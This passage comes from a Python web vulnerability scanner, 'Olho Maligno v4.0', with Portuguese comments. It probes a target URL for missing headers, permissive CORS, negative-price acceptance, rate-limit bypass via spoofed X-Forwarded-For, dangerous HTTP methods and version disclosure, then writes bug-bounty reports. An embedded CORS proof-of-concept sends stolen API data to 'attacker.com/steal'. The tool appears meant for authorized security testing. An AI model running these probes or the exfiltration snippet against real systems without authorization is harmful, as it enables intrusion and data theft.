                    exploitation_difficulty="Trivial",
                    business_impact="Exposição de credenciais e configurações",
                ))
    
    def _test_security_headers(self):
        """Testa headers de segurança"""
        resp = self.http_client.get(self.base_url)
        
        if resp:
            missing = []
            for header in ['Strict-Transport-Security', 'X-Content-Type-Options', 'X-Frame-Options', 'Content-Security-Policy']:
                if header not in resp.headers:
                    missing.append(header)
            
            if len(missing) >= 3:
                self._add_exploit(ExploitableVulnerability(
                    title="Headers de Segurança Ausentes",
                    severity=SeverityLevel.MEDIUM,
                    exploit_status=ExploitStatus.CONFIRMED,
                    url=self.base_url,
                    vuln_type="Security Misconfiguration",
                    owasp_category="A05: Security Misconfiguration",
                    evidence=f"Headers faltando: {', '.join(missing)}",
                    remediation="Configure headers de segurança no servidor",
                    cvss_score=5.3,
                    exploitation_difficulty="Trivial",
                    business_impact="Proteção reduzida contra ataques comuns",
                ))
    
    def _test_cors(self):
        """Testa CORS"""
        resp = self.http_client.options(
            self.base_url,
            headers={'Origin': 'http://attacker.com'}
        )
        
        if resp and resp.headers.get('Access-Control-Allow-Origin') == '*':
            self._add_exploit(ExploitableVulnerability(
                title="CORS Permissivo (Access-Control-Allow-Origin: *)",
                severity=SeverityLevel.MEDIUM,
                exploit_status=ExploitStatus.CONFIRMED,
                url=self.base_url,
                vuln_type="CORS",
                owasp_category="A01: Broken Access Control",
                evidence="Access-Control-Allow-Origin: *",
                exploit_code="""
// Qualquer site pode acessar
fetch('http://target.com/api/data', {
  credentials: 'include'
}).then(r => r.json()).then(d => {
  // Enviar dados para attacker
  fetch('http://attacker.com/steal?data=' + JSON.stringify(d))
})
""",
                remediation="Configure CORS para domínios específicos",
                cvss_score=5.3,
                exploitation_difficulty="Fácil",
                business_impact="Acesso não autorizado a dados da API",
            ))
    
    def _test_business_logic(self):
        """Testa lógica de negócio"""
        # Price manipulation
        resp = self.http_client.post(self.base_url, data={'price': '-1000'})
        if resp and resp.status_code == 200:
            self._add_exploit(ExploitableVulnerability(
                title="Business Logic Flaw - Preço Negativo",
                severity=SeverityLevel.HIGH,
                exploit_status=ExploitStatus.PROBABLE,
                url=self.base_url,
                vuln_type="Business Logic Flaw",
                owasp_category="A04: Insecure Design",
                evidence="Preço negativo aceito",
                exploit_code="""
# Comprar com preço negativo = ganhar dinheiro
data = {'product_id': 1, 'quantity': 1, 'price': -1000}
requests.post(url + '/checkout', data=data)
""",
                remediation="Valide preços e quantidade no backend",
                cvss_score=7.2,
                exploitation_difficulty="Fácil",
                business_impact="Fraude financeira e perda de receita",
            ))
    
    def _test_rate_limit_bypass(self):
        """Testa bypass de rate limiting"""
        # Test com header X-Forwarded-For
        for i in range(5):
            resp = self.http_client.post(
                self.base_url,
                data={'username': 'admin', 'password': f'pass{i}'},
                headers={'X-Forwarded-For': f'127.0.0.{i}'}
            )
            if resp and resp.status_code == 200:
                logger.info("✓ Rate limit bypass detectado com X-Forwarded-For")
    
    def _test_http_methods(self):
        """Testa métodos HTTP perigosos"""
        for method in ['PUT', 'DELETE', 'TRACE']:
            resp = self.http_client.request(method, self.base_url)
            if resp and resp.status_code < 400:
                self._add_exploit(ExploitableVulnerability(
                    title=f"Método HTTP {method} Habilitado",
                    severity=SeverityLevel.HIGH if method in ['PUT', 'DELETE'] else SeverityLevel.MEDIUM,
                    exploit_status=ExploitStatus.CONFIRMED,
                    url=self.base_url,
                    vuln_type="HTTP Methods",
                    owasp_category="A05: Security Misconfiguration",
                    evidence=f"Método {method} retornou {resp.status_code}",
                    remediation=f"Desabilite o método {method}",
                    cvss_score=7.5,
                    exploitation_difficulty="Fácil",
                    business_impact="Manipulação ou deleção de recursos",
                ))
    
    def _test_info_disclosure(self):
        """Testa disclosure de informação"""
        resp = self.http_client.get(self.base_url)
        
        if resp:
            # Check versão exposta
            version_patterns = [
                r'Apache/(\d+\.\d+)',
                r'nginx/(\d+\.\d+)',
                r'PHP/(\d+\.\d+)',
                r'X-Powered-By: (.+)',
            ]
            
            for pattern in version_patterns:
                match = re.search(pattern, resp.text + str(resp.headers))
                if match:
                    self._add_exploit(ExploitableVulnerability(
                        title="Versão do Software Exposta",
                        severity=SeverityLevel.LOW,
                        exploit_status=ExploitStatus.CONFIRMED,
                        url=self.base_url,
                        vuln_type="Information Disclosure",
                        owasp_category="A05: Security Misconfiguration",
                        evidence=f"Versão: {match.group(1)}",
                        remediation="Remova headers que expõem versões",
                        cvss_score=3.7,
                        exploitation_difficulty="Trivial",
                        business_impact="Informação para reconnaissance",
                    ))


# ════════════════════════════════════════════════════════════════════════════
# GERADOR DE RELATÓRIOS PROFISSIONAL
# ════════════════════════════════════════════════════════════════════════════

class BugBountyReportGenerator:
    """Gera relatórios profissionais para bug bounty"""
    
    def __init__(self, exploits: List[ExploitableVulnerability], base_url: str):
        self.exploits = exploits
        self.base_url = base_url
        self.timestamp = datetime.now()
    
    def generate_all(self, output_dir: str = "."):
        """Gera todos os formatos"""
        os.makedirs(output_dir, exist_ok=True)
        
        timestamp = self.timestamp.strftime("%Y%m%d_%H%M%S")
        
        # JSON
        self.generate_json(f"{output_dir}/bug_bounty_report_{timestamp}.json")
        
        # HTML
        self.generate_html(f"{output_dir}/bug_bounty_report_{timestamp}.html")
        
        # TXT
        self.generate_txt(f"{output_dir}/bug_bounty_report_{timestamp}.txt")
        
        # Markdown para HackerOne/Bugcrowd
        self.generate_markdown(f"{output_dir}/bug_bounty_report_{timestamp}.md")
    
    def generate_json(self, filepath: str):
        """Gera JSON estruturado"""
        report = {
            'target': self.base_url,
            'timestamp': self.timestamp.isoformat(),
            'total_exploitable': len(self.exploits),
            'summary': self._generate_summary(),
            'exploits': [e.to_dict() for e in sorted(
                self.exploits,
                key=lambda x: x.severity.value[2],
                reverse=True
            )],
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        logger.info(f"✓ Relatório JSON: {filepath}")
    
    def generate_html(self, filepath: str):
        """Gera HTML interativo"""
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🔮 Olho Maligno - Bug Bounty Report</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Courier New', monospace; background: linear-gradient(135deg, #0a0e27, #1a1f3a); color: #e0e0e0; }}
        .container {{ max-width: 1400px; margin: 0 auto; padding: 20px; }}
        header {{ background: linear-gradient(135deg, #ff0000, #ff6600); padding: 40px; border-radius: 10px; margin-bottom: 30px; text-align: center; }}
        h1 {{ font-size: 3em; margin-bottom: 10px; color: white; }}
        .exploit-item {{ background: #1a1f3a; margin: 20px 0; padding: 20px; border-left: 5px solid #ff0000; border-radius: 5px; }}
        .exploit-item.high {{ border-left-color: #ff6600; }}
        .exploit-item.medium {{ border-left-color: #ffaa00; }}
        .exploit-item.low {{ border-left-color: #00aa00; }}
        .title {{ font-size: 1.3em; font-weight: bold; margin: 10px 0; color: #ff0000; }}
        .url {{ color: #0099ff; word-break: break-all; font-size: 0.9em; }}
        .code {{ background: #000; padding: 10px; margin: 10px 0; border-radius: 5px; overflow-x: auto; }}
        .status {{ display: inline-block; padding: 5px 10px; border-radius: 3px; margin: 5px 0; font-weight: bold; }}
        .status.critical {{ background: #ff0000; color: white; }}
        .status.high {{ background: #ff6600; color: white; }}
        .status.medium {{ background: #ffaa00; color: black; }}
        .dashboard {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }}
        .stat {{ background: #1a1f3a; padding: 20px; border-radius: 5px; text-align: center; border: 2px solid #ff0000; }}
        .stat-number {{ font-size: 2em; font-weight: bold; color: #ff0000; }}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🔮 OLHO MALIGNO v4.0</h1>
            <h2>Bug Bounty Report</h2>
            <p>Target: {self.base_url}</p>
            <p>Data: {self.timestamp.strftime('%d/%m/%Y %H:%M:%S')}</p>
        </header>
        
        <div class="dashboard">
            <div class="stat">
                <div class="stat-number">{len([e for e in self.exploits if e.severity == SeverityLevel.CRITICAL])}</div>
                <div>CRÍTICAS</div>
            </div>
            <div class="stat">
                <div class="stat-number">{len([e for e in self.exploits if e.severity == SeverityLevel.HIGH])}</div>
                <div>ALTAS</div>
            </div>
            <div class="stat">
                <div class="stat-number">{len([e for e in self.exploits if e.severity == SeverityLevel.MEDIUM])}</div>
                <div>MÉDIAS</div>
            </div>
            <div class="stat">
                <div class="stat-number">{len(self.exploits)}</div>
                <div>TOTAL</div>
            </div>
        </div>
"""
        
        for exploit in sorted(self.exploits, key=lambda x: x.severity.value[2], reverse=True):
            severity_class = exploit.severity.name.lower()
            html += f"""
        <div class="exploit-item {severity_class}">
            <div class="title">{exploit.title}</div>
            <div class="status critical">{exploit.severity.value[0]} - {exploit.exploit_status.value}</div>
            <div>OWASP: {exploit.owasp_category}</div>
            <div class="url">URL: {exploit.url}</div>
            <div class="code">{exploit.exploit_code[:200]}...</div>
            <div style="margin-top: 10px; color: #0f0;">
                ✓ Remediação: {exploit.remediation}
            </div>
        </div>
"""
        
        html += """
    </div>
</body>
</html>
"""
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(html)
        
        logger.info(f"✓ Relatório HTML: {filepath}")
    
    def generate_txt(self, filepath: str):
        """Gera TXT detalhado"""
        lines = [
            "\n" + OLHO_MALIGNO_ASCII,
            "═" * 80,
            "BUG BOUNTY REPORT - FALHAS EXPLORÁVEIS ENCONTRADAS",
            "═" * 80,
            f"\nTarget: {self.base_url}",
            f"Data: {self.timestamp.strftime('%d/%m/%Y %H:%M:%S')}",
            f"Total de Falhas: {len(self.exploits)}\n",
        ]
        
        by_severity = {}
        for exploit in self.exploits:
            sev = exploit.severity.name
            if sev not in by_severity:
                by_severity[sev] = []
            by_severity[sev].append(exploit)
        
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
            exploits = by_severity.get(severity, [])
            if exploits:
                lines.append(f"\n[{severity}] - {len(exploits)} EXPLORAÇÃO(ÕES)")
                lines.append("═" * 80)
                
                for i, exploit in enumerate(exploits, 1):
                    lines.append(f"\n#{i} {exploit.title}")
                    lines.append(f"  Status: {exploit.exploit_status.value}")
                    lines.append(f"  OWASP: {exploit.owasp_category}")
                    lines.append(f"  CVSS Score: {exploit.severity.value[2]}/10")
                    lines.append(f"  URL Exploável: {exploit.url}")
                    if exploit.parameter:
                        lines.append(f"  Parâmetro: {exploit.parameter}")
                    lines.append(f"  Evidência: {exploit.evidence}")
                    lines.append(f"  Dificuldade: {exploit.exploitation_difficulty}")
                    lines.append(f"  Impacto: {exploit.business_impact}")
                    lines.append(f"\n  EXPLOIT CODE:")
                    for code_line in exploit.exploit_code.split('\n')[:10]:
                        lines.append(f"  {code_line}")
                    lines.append(f"\n  REMEDIAÇÃO: {exploit.remediation}")
                    lines.append("-" * 80)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write('\n'.join(lines))
        
        logger.info(f"✓ Relatório TXT: {filepath}")
    
    def generate_markdown(self, filepath: str):
        """Gera Markdown para HackerOne/Bugcrowd"""
        md = f"""# 🔮 Olho Maligno - Bug Bounty Report

**Target:** {self.base_url}  
**Data:** {self.timestamp.strftime('%d/%m/%Y %H:%M:%S')}  
**Total de Falhas Exploráveis:** {len(self.exploits)}

---

## 📊 Resumo

| Severidade | Quantidade |
|-----------|-----------|
| CRÍTICA | {len([e for e in self.exploits if e.severity == SeverityLevel.CRITICAL])} |
| ALTA | {len([e for e in self.exploits if e.severity == SeverityLevel.HIGH])} |
| MÉDIA | {len([e for e in self.exploits if e.severity == SeverityLevel.MEDIUM])} |
| BAIXA | {len([e for e in self.exploits if e.severity == SeverityLevel.LOW])} |

---

## 💥 Falhas Exploráveis Encontradas

"""
        
        for exploit in sorted(self.exploits, key=lambda x: x.severity.value[2], reverse=True):
            md += f"""
### #{exploit.title}

- **Severidade:** {exploit.severity.value[0]}
- **Status:** {exploit.exploit_status.value}
- **OWASP:** {exploit.owasp_category}
- **CVSS Score:** {exploit.severity.value[2]}/10
- **URL:** `{exploit.url}`
{f'- **Parâmetro:** `{exploit.parameter}`' if exploit.parameter else ''}

**Descrição:**
{exploit.evidence}

**Exploit:**

**Remediação:**
{exploit.remediation}

---

"""
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(md)
        
        logger.info(f"✓ Relatório Markdown: {filepath}")
    
    def _generate_summary(self) -> Dict:
        """Gera resumo"""
        return {
            'total': len(self.exploits),
            'critical': len([e for e in self.exploits if e.severity == SeverityLevel.CRITICAL]),
            'high': len([e for e in self.exploits if e.severity == SeverityLevel.HIGH]),
            'medium': len([e for e in self.exploits if e.severity == SeverityLevel.MEDIUM]),
            'low': len([e for e in self.exploits if e.severity == SeverityLevel.LOW]),
        }


# ════════════════════════════════════════════════════════════════════════════
# SCANNER PRINCIPAL v4.0
# ════════════════════════════════════════════════════════════════════════════

class OlhoMalignoV4Final:
    """OLHO MALIGNO v4.0 FINAL - Scanner supremo"""
    
    def __init__(self, url: str, **kwargs):
        self.url = url
        self.config = kwargs
        self.http_client = HTTPClientUltra(
            rate=self.config.get('rate', 10.0),
            timeout=self.config.get('timeout', 10),
            delay=self.config.get('delay', 0.5),
            proxy=self.config.get('proxy'),
        )
    
    def print_banner(self):
        """Imprime banner bonito"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"{Fore.RED}{Style.BRIGHT}{OLHO_MALIGNO_ASCII}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'═' * 80}{Style.RESET_ALL}")
        print(f"{Fore.RED}{Style.BRIGHT}OLHO MALIGNO v4.0 - ULTIMATE FINAL{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}ENCONTRA TUDO - 300% COVERAGE{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'═' * 80}{Style.RESET_ALL}\n")
    
    def run(self):
        """Executa scan completo"""
        self.print_banner()
        
        logger.info(f"{Fore.GREEN}🎯 Target: {self.url}{Style.RESET_ALL}")
        logger.info(f"{Fore.GREEN}⏱️  Iniciando scan...{Style.RESET_ALL}\n")
        
        scanner = UltimateFindAllVulnerabilityScanner(self.http_client, self.url)
        exploits = scanner.scan_everything()
        
        logger.info(f"\n{Fore.GREEN}{'═' * 80}{Style.RESET_ALL}")
        logger.info(f"{Fore.GREEN}✓ SCAN CONCLUÍDO{Style.RESET_ALL}")
        logger.info(f"{Fore.GREEN}{'═' * 80}{Style.RESET_ALL}\n")
        
        # Resumo
        print(f"{Fore.MAGENTA}📊 RESUMO FINAL:{Style.RESET_ALL}")
        print(f"  Total de Falhas Exploráveis: {Fore.RED}{len(exploits)}{Style.RESET_ALL}")
        print(f"  Críticas: {Fore.RED}{len([e for e in exploits if e.severity == SeverityLevel.CRITICAL])}{Style.RESET_ALL}")
        print(f"  Altas: {Fore.YELLOW}{len([e for e in exploits if e.severity == SeverityLevel.HIGH])}{Style.RESET_ALL}\n")
        
        # Gerar relatórios
        logger.info(f"{Fore.CYAN}📄 Gerando relatórios...{Style.RESET_ALL}")
        generator = BugBountyReportGenerator(exploits, self.url)
        generator.generate_all()
        
        return exploits


# ════════════════════════════════════════════════════════════════════════════
# CLI FINAL
# ════════════════════════════════════════════════════════════════════════════

def main():
    """Função principal"""
    parser = argparse.ArgumentParser(
        description='🔮 Olho Maligno v4.0 - Ultimate Final Security Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXEMPLOS:
  python olho_maligno_v4_final.py -u https://example.com
  python olho_maligno_v4_final.py -u https://example.com --proxy http://127.0.0.1:8080
  python olho_maligno_v4_final.py -u https://example.com --rate 20 --delay 0.2

⚠️  AVISO: Use apenas em ambientes autorizados!
"""
    )
    
    parser.add_argument('-u', '--url', required=True, help='URL alvo')
    parser.add_argument('--rate', type=float, default=10.0, help='Rate (req/s)')
    parser.add_argument('--delay', type=float, default=0.5, help='Delay (segundos)')
    parser.add_argument('--timeout', type=int, default=10, help='Timeout')
    parser.add_argument('--proxy', help='Proxy (http://ip:port)')
    
    args = parser.parse_args()
    
    if not args.url.startswith(('http://', 'https://')):
        print(f"{Fore.RED}Erro: URL deve começar com http:// ou https://{Style.RESET_ALL}")
        return 1
    
    try:
        scanner = OlhoMalignoV4Final(
            url=args.url,
            rate=args.rate,
            delay=args.delay,
            timeout=args.timeout,
            proxy=args.proxy,
        )
        scanner.run()
        return 0
    except KeyboardInterrupt:
        logger.warning(f"\n{Fore.RED}Scan interrompido{Style.RESET_ALL}")
        return 0
    except Exception as e:
        logger.error(f"Erro: {e}")
        return 1


if __name__ == '__main__':
    sys.exit(main())
